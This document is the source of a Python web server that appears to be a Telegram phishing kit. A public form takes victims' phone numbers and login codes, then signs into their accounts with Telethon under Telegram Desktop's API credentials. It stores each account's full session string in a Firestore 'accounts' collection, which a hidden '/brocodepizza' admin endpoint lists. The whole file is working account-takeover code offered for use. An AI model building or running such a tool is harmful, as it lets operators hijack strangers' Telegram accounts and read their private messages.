import os
import json
import time
import uuid
import asyncio
import threading
import base64
import logging
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
import urllib.parse
from dotenv import load_dotenv

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    ApiIdInvalidError,
    FloodWaitError,
)
from google.oauth2 import service_account
from google.cloud import firestore

load_dotenv()

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s"
)
log = logging.getLogger("telegram_telethon")

# Default official Telegram Desktop API credentials
API_ID = int(os.environ.get("TELEGRAM_API_ID", 2040))
API_HASH = os.environ.get("TELEGRAM_API_HASH", "b18441a1ff607e10a989891a5462e627")

MAX_CONCURRENT_SESSIONS = int(os.environ.get("MAX_CONCURRENT_SESSIONS", 40))
ADMIN_USER = os.environ.get("ADMIN_USER")
ADMIN_PASS = os.environ.get("ADMIN_PASS")
CODE_WAIT = int(os.environ.get("CODE_WAIT", 300))

# Initialize Firestore
firestore_db = None
try:
    fb_key = os.environ.get("FIREBASE_KEY")
    if fb_key:
        fb_key = fb_key.strip().strip("'\"")
        sa_info = json.loads(fb_key)
        creds = service_account.Credentials.from_service_account_info(sa_info)
        firestore_db = firestore.Client(project=sa_info.get("project_id"), credentials=creds)
        log.info("Firestore initialized successfully")
    else:
        log.warning("FIREBASE_KEY not found in environment; Firestore disabled")
except Exception as e:
    log.error(f"Failed to initialize Firestore: {e}")

# In-memory session tracking
sessions = {}
sessions_lock = threading.Lock()

# Global Asyncio Event Loop & Semaphore for 40 concurrent sessions
async_loop = asyncio.new_event_loop()
concurrency_semaphore = asyncio.Semaphore(MAX_CONCURRENT_SESSIONS)

def _start_async_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()

loop_thread = threading.Thread(target=_start_async_loop, args=(async_loop,), daemon=True)
loop_thread.start()


# ---------------------------------------------------------------------------
# Telethon Async Workflows
# ---------------------------------------------------------------------------

async def _process_phone_login(session_id):
    """Requests Telegram verification code using Telethon StringSession"""
    async with concurrency_semaphore:
        with sessions_lock:
            sess = sessions.get(session_id)
            if not sess:
                return
            sess["status"] = "processing"

        phone = sess["phone_number"]
        log.info(f"Starting Telethon login for session {session_id} ({phone})")

        try:
            client = TelegramClient(StringSession(), API_ID, API_HASH, loop=async_loop)
            await client.connect()

            res = await client.send_code_request(phone)

            with sessions_lock:
                sess["client"] = client
                sess["phone_code_hash"] = res.phone_code_hash
                sess["status"] = "code_required"
                sess["code_expiry"] = time.time() + CODE_WAIT
            log.info(f"Code requested successfully for session {session_id}")

        except FloodWaitError as e:
            err_msg = f"error: flood_wait_{e.seconds}s"
            log.error(f"Flood wait error for {session_id}: {e}")
            with sessions_lock:
                sess["status"] = err_msg
        except Exception as e:
            log.error(f"Error requesting code for session {session_id}: {e}")
            with sessions_lock:
                sess["status"] = f"error: {str(e)}"


async def _process_code_entry(session_id, code):
    """Submits code to complete authentication and saves StringSession to Firestore"""
    async with concurrency_semaphore:
        with sessions_lock:
            sess = sessions.get(session_id)
            if not sess:
                return
            client = sess.get("client")
            phone = sess.get("phone_number")
            phone_code_hash = sess.get("phone_code_hash")

        if not client or not phone_code_hash:
            with sessions_lock:
                sess["status"] = "error: invalid_session_state"
            return

        log.info(f"Submitting verification code for session {session_id}")

        try:
            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            string_session_str = client.session.save()

            with sessions_lock:
                sess["string_session"] = string_session_str
                sess["status"] = "login_success"

            log.info(f"Session {session_id} signed in successfully!")

            # Store in Firestore
            if firestore_db:
                doc = {
                    "phone_number": phone,
                    "string_session": string_session_str,
                    "created_at": firestore.SERVER_TIMESTAMP
                }
                firestore_db.collection("accounts").add(doc)
                log.info(f"Saved Telethon string session to Firestore for {phone}")

            await client.disconnect()

        except SessionPasswordNeededError:
            log.warning(f"Session {session_id} requires 2FA password")
            with sessions_lock:
                sess["status"] = "error: 2fa_password_required"
        except (PhoneCodeInvalidError, PhoneCodeExpiredError) as e:
            log.error(f"Code error for {session_id}: {e}")
            with sessions_lock:
                sess["status"] = f"error: {e.message if hasattr(e, 'message') else str(e)}"
        except Exception as e:
            log.error(f"Error signing in for session {session_id}: {e}")
            with sessions_lock:
                sess["status"] = f"error: {str(e)}"


# ---------------------------------------------------------------------------
# HTTP Web Server
# ---------------------------------------------------------------------------

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True


class TelegramHTTPHandler(BaseHTTPRequestHandler):
    def _set_common_headers(self, content_type="application/json"):
        self.send_header("Content-type", content_type)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, Authorization, X-Session-Id")

    def _is_authorized(self):
        if not (ADMIN_USER and ADMIN_PASS):
            return True
        auth = self.headers.get("Authorization")
        if not auth or not auth.lower().startswith("basic "):
            return False
        try:
            token = auth.split(None, 1)[1]
            decoded = base64.b64decode(token).decode("utf-8")
            user, pwd = decoded.split(":", 1)
            return user == ADMIN_USER and pwd == ADMIN_PASS
        except Exception:
            return False

    def _require_auth(self):
        self.send_response(401)
        self.send_header("WWW-Authenticate", 'Basic realm="Restricted"')
        self._set_common_headers()
        self.end_headers()
        self.wfile.write(json.dumps({"error": "authentication_required"}).encode())

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        query = urllib.parse.parse_qs(parsed.query)
        session_id = query.get("session", [None])[0] or self.headers.get("X-Session-Id")

        if path == "/status":
            if not session_id:
                self.send_response(400)
                self._set_common_headers()
                self.end_headers()
                self.wfile.write(json.dumps({"error": "missing_session_id"}).encode())
                return

            with sessions_lock:
                sess = sessions.get(session_id)

            if not sess:
                self.send_response(404)
                self._set_common_headers()
                self.end_headers()
                self.wfile.write(json.dumps({"error": "session_not_found"}).encode())
                return

            self.send_response(200)
            self._set_common_headers()
            self.end_headers()
            self.wfile.write(json.dumps({"status": sess.get("status", "unknown")}).encode())
            return

        elif path == "/":
            try:
                with open("form.html", "rb") as f:
                    content = f.read()
                self.send_response(200)
                self._set_common_headers("text/html")
                self.end_headers()
                self.wfile.write(content)
            except FileNotFoundError:
                self.send_error(404, "form.html not found")

        elif path == "/brocodepizza":
            if not self._is_authorized():
                return self._require_auth()

            accept = self.headers.get("Accept", "")
            if "application/json" in accept or query.get("format", [""])[0] == "json":
                if not firestore_db:
                    self.send_response(500)
                    self._set_common_headers()
                    self.end_headers()
                    self.wfile.write(json.dumps({"error": "Firestore disabled"}).encode())
                    return

                try:
                    docs = firestore_db.collection("accounts").stream()
                    accounts = []
                    for doc in docs:
                        data = doc.to_dict()
                        if "created_at" in data and data["created_at"]:
                            data["created_at"] = data["created_at"].isoformat()
                        accounts.append(data)

                    self.send_response(200)
                    self._set_common_headers()
                    self.end_headers()
                    self.wfile.write(json.dumps(accounts).encode())
                except Exception as e:
                    self.send_response(500)
                    self._set_common_headers()
                    self.end_headers()
                    self.wfile.write(json.dumps({"error": str(e)}).encode())
            else:
                try:
                    with open("home.html", "rb") as f:
                        content = f.read()
                    self.send_response(200)
                    self._set_common_headers("text/html")
                    self.end_headers()
                    self.wfile.write(content)
                except FileNotFoundError:
                    self.send_error(404, "home.html not found")
        else:
            self.send_error(404, "Endpoint not found")

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        post_data = self.rfile.read(content_length) if content_length > 0 else b"{}"

        try:
            data = json.loads(post_data.decode("utf-8"))
        except Exception:
            data = {}

        if self.path == "/phone":
            country_code = str(data.get("country_code", "")).strip().lstrip("+")
            phone_number = str(data.get("phone_number", "")).strip()

            if not country_code or not phone_number:
                self.send_response(400)
                self._set_common_headers()
                self.end_headers()
                self.wfile.write(json.dumps({"error": "Missing country_code or phone_number"}).encode())
                return

            full_phone = f"+{country_code}{phone_number}"
            session_id = uuid.uuid4().hex

            sess = {
                "created_at": time.time(),
                "phone_number": full_phone,
                "status": "queued",
                "client": None,
                "phone_code_hash": None,
                "string_session": None,
            }

            with sessions_lock:
                sessions[session_id] = sess

            # Dispatch task into the 40-worker semaphore queue
            asyncio.run_coroutine_threadsafe(_process_phone_login(session_id), async_loop)

            self.send_response(200)
            self._set_common_headers()
            self.end_headers()
            self.wfile.write(json.dumps({
                "message": "Queued for Telethon login.",
                "session": session_id
            }).encode())
            return

        elif self.path == "/code":
            session_id = data.get("session") or self.headers.get("X-Session-Id")
            code = str(data.get("code", "")).strip()

            if not session_id or not code:
                self.send_response(400)
                self._set_common_headers()
                self.end_headers()
                self.wfile.write(json.dumps({"error": "Missing session_id or code"}).encode())
                return

            with sessions_lock:
                sess = sessions.get(session_id)

            if not sess:
                self.send_response(404)
                self._set_common_headers()
                self.end_headers()
                self.wfile.write(json.dumps({"error": "session_not_found"}).encode())
                return

            asyncio.run_coroutine_threadsafe(_process_code_entry(session_id, code), async_loop)

            self.send_response(200)
            self._set_common_headers()
            self.end_headers()
            self.wfile.write(json.dumps({"message": "Code received, processing..."}).encode())
            return

        else:
            self.send_error(404, "Invalid endpoint")

    def do_OPTIONS(self):
        self.send_response(200)
        self._set_common_headers()
        self.end_headers()


def run_server():
    port = int(os.environ.get("PORT", 8765))
    server = ThreadedHTTPServer(("0.0.0.0", port), TelegramHTTPHandler)
    log.info(f"Server listening on port {port} (Max 40 concurrent Telethon sessions)")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        log.info("Shutting down server...")
        server.server_close()

if __name__ == "__main__":
    run_server()